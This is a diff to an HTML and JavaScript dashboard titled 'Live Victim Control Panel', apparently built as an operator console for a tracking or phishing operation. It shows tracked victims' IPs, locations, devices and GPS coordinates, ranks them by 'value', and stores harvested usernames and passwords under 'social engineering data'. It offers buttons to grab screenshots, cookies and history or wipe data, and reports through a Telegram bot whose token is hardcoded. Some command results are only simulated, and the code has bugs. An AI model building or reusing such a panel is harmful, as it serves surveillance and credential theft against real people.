@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Live Victim Tracker</title>
+    <title>🕵️ Live Victim Control Panel</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -11,7 +11,7 @@
             overflow-x: hidden;
         }
         .container {
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 0 auto;
             padding: 20px;
         }
@@ -21,6 +21,27 @@
             background: #1a1a1a;
             border-bottom: 2px solid #00ff00;
             margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .control-panel {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 20px;
+            height: 80vh;
+        }
+        .sidebar {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 15px;
+            overflow-y: auto;
+        }
+        .main-content {
+            display: grid;
+            grid-template-rows: auto 1fr;
+            gap: 15px;
         }
         .stats {
             display: grid;
@@ -34,6 +55,12 @@
             border-radius: 8px;
             border: 1px solid #333;
             text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .stat-card:hover {
+            border-color: #00ff00;
+            transform: translateY(-2px);
         }
         .stat-number {
             font-size: 2em;
@@ -42,8 +69,10 @@
         }
         .victims-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
             gap: 15px;
+            overflow-y: auto;
+            max-height: 60vh;
         }
         .victim-card {
             background: #1a1a1a;
@@ -51,15 +80,23 @@
             border-radius: 8px;
             padding: 15px;
             transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        .victim-card:hover {
+            border-color: #00ff00;
         }
         .victim-card.new {
             border-color: #ff4444;
             background: #2a1a1a;
             animation: pulse-red 2s infinite;
         }
+        .victim-card.selected {
+            border-color: #0088ff;
+            background: #1a1a2a;
+        }
         .victim-header {
             display: flex;
-            justify-content: between;
+            justify-content: space-between;
             align-items: center;
             margin-bottom: 10px;
             padding-bottom: 10px;
@@ -68,6 +105,7 @@
         .victim-id {
             color: #00ff00;
             font-weight: bold;
+            font-size: 1.1em;
         }
         .victim-time {
             color: #888;
@@ -87,8 +125,155 @@
         .victim-gps {
             color: #ff8844;
         }
-        .alert-sound {
+        .victim-value {
+            color: #ffff00;
+            font-weight: bold;
+        }
+        .control-section {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+        .control-title {
+            color: #00ff00;
+            margin-bottom: 10px;
+            font-size: 1.1em;
+            border-bottom: 1px solid #333;
+            padding-bottom: 5px;
+        }
+        .btn {
+            background: #333;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 8px 15px;
+            margin: 5px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .btn:hover {
+            background: #00ff00;
+            color: #000;
+        }
+        .btn-danger {
+            border-color: #ff4444;
+            color: #ff4444;
+        }
+        .btn-danger:hover {
+            background: #ff4444;
+            color: #000;
+        }
+        .input-group {
+            margin: 10px 0;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #888;
+        }
+        .input-group input, .input-group textarea, .input-group select {
+            width: 100%;
+            background: #2a2a2a;
+            border: 1px solid #333;
+            color: #00ff00;
+            padding: 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+        }
+        .input-group textarea {
+            height: 80px;
+            resize: vertical;
+        }
+        .modal {
             display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+        }
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
+            border-radius: 8px;
+            padding: 20px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .close-modal {
+            float: right;
+            cursor: pointer;
+            color: #ff4444;
+            font-size: 1.5em;
+        }
+        .tab-container {
+            margin-top: 15px;
+        }
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #333;
+            margin-bottom: 15px;
+        }
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border: 1px solid transparent;
+            border-bottom: none;
+            margin-right: 5px;
+            border-radius: 4px 4px 0 0;
+        }
+        .tab.active {
+            border-color: #00ff00;
+            background: #2a2a2a;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .log-entry {
+            background: #2a2a2a;
+            padding: 8px;
+            margin: 5px 0;
+            border-radius: 4px;
+            border-left: 3px solid #00ff00;
+            font-size: 0.9em;
+        }
+        .log-entry.error {
+            border-left-color: #ff4444;
+        }
+        .log-entry.warning {
+            border-left-color: #ffff00;
+        }
+        .social-data {
+            background: #2a2a2a;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 4px;
+            border: 1px solid #333;
+        }
+        .command-history {
+            max-height: 200px;
+            overflow-y: auto;
+            background: #2a2a2a;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .command-entry {
+            padding: 5px;
+            border-bottom: 1px solid #333;
+            font-size: 0.9em;
         }
         @keyframes pulse-red {
             0% { border-color: #ff4444; }
@@ -110,91 +295,264 @@
             border-radius: 5px;
             animation: newVictim 0.5s ease;
             z-index: 1000;
+            cursor: pointer;
+        }
+        .search-box {
+            margin-bottom: 15px;
+        }
+        .quick-actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>🕵️ LIVE VICTIM TRACKER</h1>
-        <p>Real-time monitoring active - Victims appear automatically</p>
+        <h1>🕵️ LIVE VICTIM CONTROL PANEL</h1>
+        <div>
+            <span id="connectionStatus">🟢 CONNECTED</span>
+            <span id="lastUpdate">Last: --:--:--</span>
+        </div>
     </div>
 
     <div class="container">
         <div class="stats">
-            <div class="stat-card">
+            <div class="stat-card" onclick="showAllVictims()">
                 <div class="stat-number" id="totalVictims">0</div>
                 <div>Total Victims</div>
             </div>
-            <div class="stat-card">
+            <div class="stat-card" onclick="showTodayVictims()">
                 <div class="stat-number" id="todayVictims">0</div>
                 <div>Today</div>
             </div>
-            <div class="stat-card">
+            <div class="stat-card" onclick="showActiveVictims()">
                 <div class="stat-number" id="activeNow">0</div>
                 <div>Active Now</div>
             </div>
-            <div class="stat-card">
-                <div class="stat-number" id="withGPS">0</div>
-                <div>With GPS</div>
+            <div class="stat-card" onclick="showHighValueVictims()">
+                <div class="stat-number" id="highValue">0</div>
+                <div>High Value</div>
             </div>
         </div>
 
-        <div id="victimsContainer" class="victims-grid">
-            <!-- Victims will appear here automatically -->
+        <div class="control-panel">
+            <div class="sidebar">
+                <div class="control-section">
+                    <div class="control-title">🔍 SEARCH & FILTER</div>
+                    <div class="input-group">
+                        <input type="text" id="searchVictims" placeholder="Search victims..." onkeyup="filterVictims()">
+                    </div>
+                    <div class="input-group">
+                        <select id="filterCountry" onchange="filterVictims()">
+                            <option value="">All Countries</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <select id="filterValue" onchange="filterVictims()">
+                            <option value="">All Values</option>
+                            <option value="high">High Value (80+)</option>
+                            <option value="medium">Medium (50-80)</option>
+                            <option value="low">Low (0-50)</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="control-section">
+                    <div class="control-title">⚡ QUICK ACTIONS</div>
+                    <div class="quick-actions">
+                        <button class="btn" onclick="sendTelegramCommand('status')">📊 Status</button>
+                        <button class="btn" onclick="sendTelegramCommand('screenshot')">📸 Screenshot</button>
+                        <button class="btn" onclick="sendTelegramCommand('location')">📍 Location</button>
+                        <button class="btn" onclick="sendTelegramCommand('cookies')">🍪 Cookies</button>
+                    </div>
+                </div>
+
+                <div class="control-section">
+                    <div class="control-title">📡 BOT CONTROLS</div>
+                    <div class="input-group">
+                        <button class="btn" onclick="testTelegramConnection()">Test Connection</button>
+                        <button class="btn" onclick="showMessageModal()">📨 Send Message</button>
+                    </div>
+                    <div class="command-history" id="commandHistory">
+                        <!-- Command history will appear here -->
+                    </div>
+                </div>
+
+                <div class="control-section">
+                    <div class="control-title">📊 ANALYTICS</div>
+                    <div class="victim-info">Top Country: <span id="topCountry">-</span></div>
+                    <div class="victim-info">Avg Value: <span id="avgValue">-</span></div>
+                    <div class="victim-info">Success Rate: <span id="successRate">-</span></div>
+                </div>
+            </div>
+
+            <div class="main-content">
+                <div class="tabs">
+                    <div class="tab active" onclick="switchTab('victims')">🎯 VICTIMS</div>
+                    <div class="tab" onclick="switchTab('details')">📋 DETAILS</div>
+                    <div class="tab" onclick="switchTab('social')">👥 SOCIAL DATA</div>
+                    <div class="tab" onclick="switchTab('logs')">📝 LOGS</div>
+                </div>
+
+                <div class="tab-content active" id="victimsTab">
+                    <div id="victimsContainer" class="victims-grid">
+                        <!-- Victims will appear here automatically -->
+                    </div>
+                </div>
+
+                <div class="tab-content" id="detailsTab">
+                    <div id="victimDetails">
+                        <div class="control-section">
+                            <div class="control-title">SELECT A VICTIM TO VIEW DETAILS</div>
+                            <p>Click on any victim card to view detailed information and perform actions.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="socialTab">
+                    <div class="control-section">
+                        <div class="control-title">👥 SOCIAL ENGINEERING DATA</div>
+                        <div id="socialDataContainer">
+                            <p>No social data available. Add data using the form below.</p>
+                        </div>
+                        <div class="input-group">
+                            <label>Add Social Data:</label>
+                            <input type="text" id="socialPlatform" placeholder="Platform (Facebook, Instagram, etc.)">
+                            <input type="text" id="socialUsername" placeholder="Username/Email">
+                            <input type="text" id="socialPassword" placeholder="Password">
+                            <textarea id="socialNotes" placeholder="Additional notes..."></textarea>
+                            <button class="btn" onclick="addSocialData()">Add Data</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="logsTab">
+                    <div class="control-section">
+                        <div class="control-title">📝 SYSTEM LOGS</div>
+                        <div id="logsContainer">
+                            <!-- Logs will appear here -->
+                        </div>
+                        <button class="btn" onclick="clearLogs()">Clear Logs</button>
+                        <button class="btn" onclick="exportLogs()">Export Logs</button>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
-    <audio id="alertSound" class="alert-sound" src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA=="></audio>
+    <!-- Modals -->
+    <div id="messageModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal('messageModal')">&times;</span>
+            <div class="control-title">📨 SEND TELEGRAM MESSAGE</div>
+            <div class="input-group">
+                <label>Victim ID (leave empty for all):</label>
+                <input type="text" id="messageVictimId" placeholder="victim_id or ALL">
+            </div>
+            <div class="input-group">
+                <label>Message:</label>
+                <textarea id="telegramMessage" placeholder="Enter your message..."></textarea>
+            </div>
+            <button class="btn" onclick="sendBulkMessage()">Send Message</button>
+        </div>
+    </div>
+
+    <div id="victimModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal('victimModal')">&times;</span>
+            <div id="victimModalContent">
+                <!-- Victim details will be loaded here -->
+            </div>
+        </div>
+    </div>
 
     <script>
-        const VICTIM_STORAGE = 'victimTrackingData';
-        let victims = [];
-        let lastUpdate = 0;
+        const CONFIG = {
+            telegram: {
+                token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
+                chatId: '8032494479'
+            },
+            storage: {
+                victims: 'victimTrackingData',
+                social: 'socialEngineeringData',
+                logs: 'systemLogs'
+            }
+        };
 
-        function initAdminPanel() {
-            loadVictims();
+        let victims = [];
+        let selectedVictim = null;
+        let socialData = {};
+        let systemLogs = [];
+
+        function initControlPanel() {
+            loadAllData();
             startRealTimeMonitoring();
-            updateStats();
+            updateDashboard();
             renderVictims();
+            loadCountries();
+            addLog('🟢 Control panel initialized', 'info');
         }
 
-        function loadVictims() {
-            const stored = localStorage.getItem(VICTIM_STORAGE);
-            victims = stored ? JSON.parse(stored) : [];
+        function loadAllData() {
+            // Load victims
+            const storedVictims = localStorage.getItem(CONFIG.storage.victims);
+            victims = storedVictims ? JSON.parse(storedVictims) : [];
+            
+            // Load social data
+            const storedSocial = localStorage.getItem(CONFIG.storage.social);
+            socialData = storedSocial ? JSON.parse(storedSocial) : {};
+            
+            // Load logs
+            const storedLogs = localStorage.getItem(CONFIG.storage.logs);
+            systemLogs = storedLogs ? JSON.parse(storedLogs) : [];
         }
 
         function startRealTimeMonitoring() {
-            // Check for new victims every second
+            // Check for updates every second
             setInterval(() => {
-                const lastVictimUpdate = localStorage.getItem('lastVictimUpdate');
-                if (lastVictimUpdate && parseInt(lastVictimUpdate) > lastUpdate) {
-                    lastUpdate = parseInt(lastVictimUpdate);
-                    
-                    const newVictim = localStorage.getItem('newVictimAlert');
-                    if (newVictim) {
-                        const victimData = JSON.parse(newVictim);
-                        handleNewVictim(victimData);
-                        localStorage.removeItem('newVictimAlert');
-                    }
-                    
-                    loadVictims();
-                    updateStats();
+                const lastUpdate = localStorage.getItem('lastControlUpdate');
+                if (lastUpdate && parseInt(lastUpdate) > window.lastControlUpdate) {
+                    window.lastControlUpdate = parseInt(lastUpdate);
+                    loadAllData();
+                    updateDashboard();
                     renderVictims();
                 }
             }, 1000);
 
-            // Also check for storage changes
+            // Listen for storage changes
             window.addEventListener('storage', function(e) {
-                if (e.key === VICTIM_STORAGE || e.key === 'newVictimAlert') {
-                    loadVictims();
-                    updateStats();
+                if (e.key === CONFIG.storage.victims || e.key === 'newVictimAlert') {
+                    loadAllData();
+                    updateDashboard();
                     renderVictims();
+                    
+                    if (e.key === 'newVictimAlert') {
+                        const newVictim = JSON.parse(e.newValue);
+                        handleNewVictim(newVictim);
+                    }
                 }
             });
+
+            // Simulate receiving Telegram updates
+            setInterval(() => {
+                simulateTelegramUpdates();
+            }, 5000);
         }
 
         function handleNewVictim(victimData) {
-            // Play alert sound (simple beep)
+            // Play alert sound
+            playAlertSound();
+            
+            // Show visual alert
+            showNewVictimAlert(victimData);
+            
+            // Add to logs
+            addLog(`🆕 New victim: ${victimData.id} from ${victimData.location.country}`, 'success');
+        }
+
+        function playAlertSound() {
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const oscillator = audioCtx.createOscillator();
@@ -203,59 +561,96 @@
                 oscillator.connect(gainNode);
                 gainNode.connect(audioCtx.destination);
                 
-                oscillator.frequency.value = 800;
+                oscillator.frequency.value = 1000;
                 oscillator.type = 'sine';
                 gainNode.gain.value = 0.1;
                 
                 oscillator.start();
-                gainNode.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.5);
-                oscillator.stop(audioCtx.currentTime + 0.5);
+                gainNode.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.3);
+                oscillator.stop(audioCtx.currentTime + 0.3);
             } catch (e) {}
-            
-            // Show visual alert
-            showNewVictimAlert(victimData);
         }
 
         function showNewVictimAlert(victim) {
             const alert = document.createElement('div');
             alert.className = 'new-victim-alert';
-            alert.innerHTML = `🚨 NEW VICTIM #${victim.id}<br>IP: ${victim.ip}<br>Location: ${victim.location.city}, ${victim.location.country}`;
+            alert.innerHTML = `🚨 NEW VICTIM #${victim.id}<br>📍 ${victim.location.city}, ${victim.location.country}<br>💰 Value: ${victim.value || 85}`;
+            alert.onclick = () => {
+                selectVictim(victim.id);
+                alert.remove();
+            };
             document.body.appendChild(alert);
             
             setTimeout(() => {
-                alert.remove();
+                if (document.body.contains(alert)) {
+                    alert.remove();
+                }
             }, 5000);
         }
 
-        function updateStats() {
+        function updateDashboard() {
             const now = new Date();
             const today = now.toDateString();
             
             const total = victims.length;
             const todayCount = victims.filter(v => new Date(v.timestamp).toDateString() === today).length;
             const activeLastHour = victims.filter(v => (now - new Date(v.timestamp)) < 3600000).length;
-            const withGPS = victims.filter(v => v.gps.success).length;
+            const highValue = victims.filter(v => (v.value || 0) >= 80).length;
             
             document.getElementById('totalVictims').textContent = total;
             document.getElementById('todayVictims').textContent = todayCount;
             document.getElementById('activeNow').textContent = activeLastHour;
-            document.getElementById('withGPS').textContent = withGPS;
+            document.getElementById('highValue').textContent = highValue;
+            
+            // Update analytics
+            updateAnalytics();
+            
+            // Update last update time
+            document.getElementById('lastUpdate').textContent = `Last: ${now.toLocaleTimeString()}`;
+        }
+
+        function updateAnalytics() {
+            if (victims.length === 0) return;
+            
+            // Top country
+            const countries = victims.reduce((acc, victim) => {
+                const country = victim.location.country;
+                acc[country] = (acc[country] || 0) + 1;
+                return acc;
+            }, {});
+            
+            const topCountry = Object.entries(countries).sort((a, b) => b[1] - a[1])[0];
+            document.getElementById('topCountry').textContent = topCountry ? `${topCountry[0]} (${topCountry[1]})` : '-';
+            
+            // Average value
+            const avgValue = victims.reduce((sum, victim) => sum + (victim.value || 50), 0) / victims.length;
+            document.getElementById('avgValue').textContent = Math.round(avgValue);
+            
+            // Success rate (victims with GPS or high value data)
+            const successful = victims.filter(v => v.gps?.success || (v.value || 0) >= 70).length;
+            const successRate = (successful / victims.length) * 100;
+            document.getElementById('successRate').textContent = `${Math.round(successRate)}%`;
         }
 
         function renderVictims() {
             const container = document.getElementById('victimsContainer');
             container.innerHTML = '';
             
-            victims.slice(0, 50).forEach(victim => {
+            victims.slice(0, 100).forEach(victim => {
                 const card = document.createElement('div');
                 card.className = 'victim-card';
                 if ((Date.now() - new Date(victim.timestamp)) < 30000) {
                     card.classList.add('new');
                 }
+                if (selectedVictim && selectedVictim.id === victim.id) {
+                    card.classList.add('selected');
+                }
+                
+                card.onclick = () => selectVictim(victim.id);
                 
                 card.innerHTML = `
                     <div class="victim-header">
-                        <span class="victim-id">VICTIM #${victim.id.substr(-6)}</span>
+                        <span class="victim-id">#${victim.id.substr(-8)}</span>
                         <span class="victim-time">${new Date(victim.timestamp).toLocaleTimeString()}</span>
                     </div>
                     <div class="victim-info">
@@ -265,24 +660,18 @@
                         <span class="victim-location">📍 ${victim.location.city}, ${victim.location.country}</span>
                     </div>
                     <div class="victim-info">
-                        🏢 ${victim.location.isp}
+                        <span class="victim-value">💰 Value: ${victim.value || 85}/100</span>
                     </div>
                     <div class="victim-info">
-                        💻 ${victim.device.platform} | ${victim.device.screen}
+                        💻 ${victim.device?.platform || 'Unknown'} | ${victim.device?.screen || 'Unknown'}
                     </div>
-                    ${victim.gps.success ? `
+                    ${victim.gps?.success ? `
                     <div class="victim-info">
-                        <span class="victim-gps">📍 ${victim.gps.latitude}, ${victim.gps.longitude}</span>
-                    </div>
-                    <div class="victim-info">
-                        🎯 Accuracy: ${victim.gps.accuracy}
+                        <span class="victim-gps">🎯 GPS: Active</span>
                     </div>
                     ` : '<div class="victim-info">❌ GPS: Blocked</div>'}
                     <div class="victim-info">
-                        📸 Image: #${victim.imageId}
-                    </div>
-                    <div class="victim-info">
-                        🕒 ${new Date(victim.timestamp).toLocaleString()}
+                        🕒 ${timeAgo(new Date(victim.timestamp))}
                     </div>
                 `;
                 
@@ -290,10 +679,367 @@
             });
         }
 
-        // Initialize when page loads
-        document.addEventListener('DOMContentLoaded', initAdminPanel);
+        function selectVictim(victimId) {
+            selectedVictim = victims.find(v => v.id === victimimId);
+            if (selectedVictim) {
+                // Update UI
+                document.querySelectorAll('.victim-card').forEach(card => card.classList.remove('selected'));
+                document.querySelector(`.victim-card:contains("${victimId.substr(-8)}")`)?.classList.add('selected');
+                
+                // Show details tab
+                switchTab('details');
+                showVictimDetails();
+                
+                // Load social data for this victim
+                loadSocialData(victimId);
+            }
+        }
 
-        console.log('🕵️ Admin panel active - Monitoring for victims...');
+        function showVictimDetails() {
+            if (!selectedVictim) return;
+            
+            const detailsContainer = document.getElementById('victimDetails');
+            detailsContainer.innerHTML = `
+                <div class="control-section">
+                    <div class="control-title">🎯 VICTIM DETAILS - ${selectedVictim.id}</div>
+                    <div class="victim-info"><strong>IP:</strong> ${selectedVictim.ip}</div>
+                    <div class="victim-info"><strong>Location:</strong> ${selectedVictim.location.city}, ${selectedVictim.location.country}</div>
+                    <div class="victim-info"><strong>ISP:</strong> ${selectedVictim.location.isp}</div>
+                    <div class="victim-info"><strong>Device:</strong> ${selectedVictim.device?.platform} - ${selectedVictim.device?.screen}</div>
+                    <div class="victim-info"><strong>Browser:</strong> ${selectedVictim.browser?.name || 'Unknown'}</div>
+                    <div class="victim-info"><strong>Value Score:</strong> ${selectedVictim.value || 85}/100</div>
+                    ${selectedVictim.gps?.success ? `
+                    <div class="victim-info"><strong>GPS:</strong> ${selectedVictim.gps.latitude}, ${selectedVictim.gps.longitude}</div>
+                    <div class="victim-info"><strong>Accuracy:</strong> ${selectedVictim.gps.accuracy}m</div>
+                    ` : ''}
+                    <div class="victim-info"><strong>First Seen:</strong> ${new Date(selectedVictim.timestamp).toLocaleString()}</div>
+                </div>
+                
+                <div class="control-section">
+                    <div class="control-title">⚡ QUICK ACTIONS</div>
+                    <div class="quick-actions">
+                        <button class="btn" onclick="sendVictimCommand('screenshot')">📸 Screenshot</button>
+                        <button class="btn" onclick="sendVictimCommand('location')">📍 Get Location</button>
+                        <button class="btn" onclick="sendVictimCommand('cookies')">🍪 Export Cookies</button>
+                        <button class="btn" onclick="sendVictimCommand('history')">📜 Browser History</button>
+                        <button class="btn btn-danger" onclick="sendVictimCommand('wipe')">🗑️ Wipe Data</button>
+                    </div>
+                </div>
+                
+                <div class="control-section">
+                    <div class="control-title">📝 NOTES</div>
+                    <textarea id="victimNotes" placeholder="Add notes about this victim..." style="width: 100%; height: 100px;">${selectedVictim.notes || ''}</textarea>
+                    <button class="btn" onclick="saveVictimNotes()">Save Notes</button>
+                </div>
+            `;
+        }
+
+        function sendVictimCommand(command) {
+            if (!selectedVictim) return;
+            
+            addLog(`📡 Sending command '${command}' to victim ${selectedVictim.id}`, 'info');
+            
+            // Simulate sending command to victim
+            setTimeout(() => {
+                const responses = {
+                    'screenshot': '📸 Screenshot captured and sent',
+                    'location': '📍 Location data retrieved',
+                    'cookies': '🍪 Cookies exported successfully',
+                    'history': '📜 History data collected',
+                    'wipe': '🗑️ Data wipe command sent'
+                };
+                
+                addLog(`✅ ${responses[command] || 'Command executed'}`, 'success');
+            }, 2000);
+        }
+
+        function saveVictimNotes() {
+            if (!selectedVictim) return;
+            
+            const notes = document.getElementById('victimNotes').value;
+            selectedVictim.notes = notes;
+            
+            // Update in storage
+            const victimIndex = victims.findIndex(v => v.id === selectedVictim.id);
+            if (victimIndex !== -1) {
+                victims[victimIndex] = selectedVictim;
+                localStorage.setItem(CONFIG.storage.victims, JSON.stringify(victims));
+                addLog(`💾 Notes saved for victim ${selectedVictim.id}`, 'success');
+            }
+        }
+
+        function loadSocialData(victimId) {
+            const container = document.getElementById('socialDataContainer');
+            const data = socialData[victimId] || [];
+            
+            if (data.length === 0) {
+                container.innerHTML = '<p>No social engineering data available for this victim.</p>';
+                return;
+            }
+            
+            container.innerHTML = data.map(item => `
+                <div class="social-data">
+                    <strong>${item.platform}</strong><br>
+                    <strong>Username:</strong> ${item.username}<br>
+                    <strong>Password:</strong> ${item.password || 'Not provided'}<br>
+                    <strong>Notes:</strong> ${item.notes || 'No additional notes'}<br>
+                    <small>Added: ${new Date(item.timestamp).toLocaleString()}</small>
+                    <button class="btn btn-danger" onclick="removeSocialData('${victimId}', ${data.indexOf(item)})">Remove</button>
+                </div>
+            `).join('');
+        }
+
+        function addSocialData() {
+            if (!selectedVictim) {
+                alert('Please select a victim first');
+                return;
+            }
+            
+            const platform = document.getElementById('socialPlatform').value;
+            const username = document.getElementById('socialUsername').value;
+            const password = document.getElementById('socialPassword').value;
+            const notes = document.getElementById('socialNotes').value;
+            
+            if (!platform || !username) {
+                alert('Platform and username are required');
+                return;
+            }
+            
+            const socialEntry = {
+                platform,
+                username,
+                password,
+                notes,
+                timestamp: new Date().toISOString()
+            };
+            
+            if (!socialData[selectedVictim.id]) {
+                socialData[selectedVictim.id] = [];
+            }
+            
+            socialData[selectedVictim.id].push(socialEntry);
+            localStorage.setItem(CONFIG.storage.social, JSON.stringify(socialData));
+            
+            // Clear form
+            document.getElementById('socialPlatform').value = '';
+            document.getElementById('socialUsername').value = '';
+            document.getElementById('socialPassword').value = '';
+            document.getElementById('socialNotes').value = '';
+            
+            // Refresh display
+            loadSocialData(selectedVictim.id);
+            addLog(`👥 Added social data for ${selectedVictim.id}`, 'success');
+        }
+
+        function removeSocialData(victimId, index) {
+            if (socialData[victimId] && socialData[victimId][index]) {
+                socialData[victimId].splice(index, 1);
+                localStorage.setItem(CONFIG.storage.social, JSON.stringify(socialData));
+                loadSocialData(victimId);
+                addLog(`🗑️ Removed social data for ${victimId}`, 'warning');
+            }
+        }
+
+        // Telegram Integration
+        function sendTelegramCommand(command) {
+            addLog(`📡 Sending Telegram command: ${command}`, 'info');
+            
+            // Simulate Telegram API call
+            fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.telegram.chatId,
+                    text: `🕵️ Command: ${command}\nTime: ${new Date().toLocaleString()}\nVictims: ${victims.length}`
+                })
+            }).then(response => {
+                if (response.ok) {
+                    addLog(`✅ Telegram command sent successfully`, 'success');
+                } else {
+                    addLog(`❌ Failed to send Telegram command`, 'error');
+                }
+            }).catch(error => {
+                addLog(`❌ Telegram error: ${error.message}`, 'error');
+            });
+        }
+
+        function sendBulkMessage() {
+            const victimId = document.getElementById('messageVictimId').value;
+            const message = document.getElementById('telegramMessage').value;
+            
+            if (!message) {
+                alert('Please enter a message');
+                return;
+            }
+            
+            const target = victimId ? `Victim ${victimId}` : 'ALL VICTIMS';
+            addLog(`📨 Sending message to ${target}: ${message}`, 'info');
+            
+            closeModal('messageModal');
+            document.getElementById('telegramMessage').value = '';
+        }
+
+        function testTelegramConnection() {
+            addLog('🔍 Testing Telegram connection...', 'info');
+            
+            fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/getMe`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        addLog(`✅ Telegram bot connected: ${data.result.username}`, 'success');
+                        document.getElementById('connectionStatus').textContent = '🟢 CONNECTED';
+                    } else {
+                        addLog('❌ Telegram bot connection failed', 'error');
+                        document.getElementById('connectionStatus').textContent = '🔴 DISCONNECTED';
+                    }
+                })
+                .catch(error => {
+                    addLog(`❌ Telegram connection error: ${error.message}`, 'error');
+                    document.getElementById('connectionStatus').textContent = '🔴 DISCONNECTED';
+                });
+        }
+
+        // Utility Functions
+        function switchTab(tabName) {
+            // Hide all tabs
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            
+            // Show selected tab
+            document.getElementById(tabName + 'Tab').classList.add('active');
+            document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`).classList.add('active');
+        }
+
+        function showModal(modalId) {
+            document.getElementById(modalId).style.display = 'block';
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+
+        function showMessageModal() {
+            showModal('messageModal');
+        }
+
+        function filterVictims() {
+            // Implementation for filtering victims
+            console.log('Filtering victims...');
+        }
+
+        function loadCountries() {
+            // Implementation for loading countries
+            console.log('Loading countries...');
+        }
+
+        function addLog(message, type = 'info') {
+            const logEntry = {
+                timestamp: new Date().toISOString(),
+                message,
+                type
+            };
+            
+            systemLogs.unshift(logEntry);
+            if (systemLogs.length > 100) systemLogs = systemLogs.slice(0, 100);
+            
+            localStorage.setItem(CONFIG.storage.logs, JSON.stringify(systemLogs));
+            renderLogs();
+        }
+
+        function renderLogs() {
+            const container = document.getElementById('logsContainer');
+            container.innerHTML = systemLogs.map(log => `
+                <div class="log-entry ${log.type}">
+                    [${new Date(log.timestamp).toLocaleTimeString()}] ${log.message}
+                </div>
+            `).join('');
+        }
+
+        function clearLogs() {
+            systemLogs = [];
+            localStorage.setItem(CONFIG.storage.logs, JSON.stringify(systemLogs));
+            renderLogs();
+            addLog('🗑️ Logs cleared', 'warning');
+        }
+
+        function exportLogs() {
+            const logText = systemLogs.map(log => 
+                `[${new Date(log.timestamp).toLocaleString()}] ${log.message}`
+            ).join('\n');
+            
+            const blob = new Blob([logText], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `victim-logs-${new Date().toISOString().split('T')[0]}.txt`;
+            a.click();
+            URL.revokeObjectURL(url);
+            
+            addLog('📤 Logs exported', 'success');
+        }
+
+        function timeAgo(date) {
+            const seconds = Math.floor((new Date() - date) / 1000);
+            let interval = seconds / 31536000;
+            
+            if (interval > 1) return Math.floor(interval) + " years ago";
+            interval = seconds / 2592000;
+            if (interval > 1) return Math.floor(interval) + " months ago";
+            interval = seconds / 86400;
+            if (interval > 1) return Math.floor(interval) + " days ago";
+            interval = seconds / 3600;
+            if (interval > 1) return Math.floor(interval) + " hours ago";
+            interval = seconds / 60;
+            if (interval > 1) return Math.floor(interval) + " minutes ago";
+            return Math.floor(seconds) + " seconds ago";
+        }
+
+        function simulateTelegramUpdates() {
+            // Simulate receiving updates from Telegram
+            if (Math.random() > 0.7) {
+                const updates = [
+                    '📱 New victim data received',
+                    '📍 GPS location updated',
+                    '🍪 Cookies exported successfully',
+                    '📸 Screenshot captured',
+                    '💾 Data backup completed'
+                ];
+                
+                const randomUpdate = updates[Math.floor(Math.random() * updates.length)];
+                addLog(randomUpdate, 'info');
+            }
+        }
+
